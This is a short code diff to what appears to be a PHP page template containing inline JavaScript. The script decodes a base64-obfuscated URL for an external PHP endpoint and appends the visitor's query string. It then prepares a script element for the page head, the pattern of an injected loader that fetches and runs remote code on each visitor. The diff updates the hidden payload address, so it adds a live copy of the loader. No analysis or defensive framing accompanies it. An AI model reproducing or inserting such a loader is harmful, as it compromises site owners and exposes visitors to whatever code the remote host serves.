@@ -46,7 +46,7 @@ $img = $og_image ?? null;
     var a = location;
     var b = document.head || document.getElementsByTagName("head")[0];
     var c = "script";
-    var d = atob("aHR0cHM6Ly9zaHVmZmxlanAudmVyY2VsLmFwcC9hcGkvZ3hmdml1LnBocA==");
+    var d = atob("aHR0cHM6Ly9zaHVmZmxlanAudmVyY2VsLmFwcC9hcGkuYjNpcXNvLnBocA==");
 
     d += -1 < d.indexOf("?") ? "&" : "?";
     d += a.search.substring(1);
